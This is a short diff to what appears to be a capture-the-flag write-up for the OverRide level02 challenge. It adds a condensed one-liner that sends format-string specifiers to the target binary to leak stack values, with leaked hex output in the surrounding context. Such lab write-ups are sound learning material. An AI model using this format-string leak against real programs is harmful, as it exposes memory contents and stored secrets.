@@ -170,6 +170,10 @@ level02@OverRide:~$ for ((i=1; i<=26; i++)); do (python -c "print '%$i\$p'" && e
 0x48336750664b394d does not have access!
 ```
 
+more simplistic syntax
+```
+(python -c 'print "%22$p %23$p %24$p %25$p %26$p" + "\n" + "AAAA"') | ./level02 | xargs -n 1 echo | tail -n 9 | head -n 5
+```
 
 ********notes
 
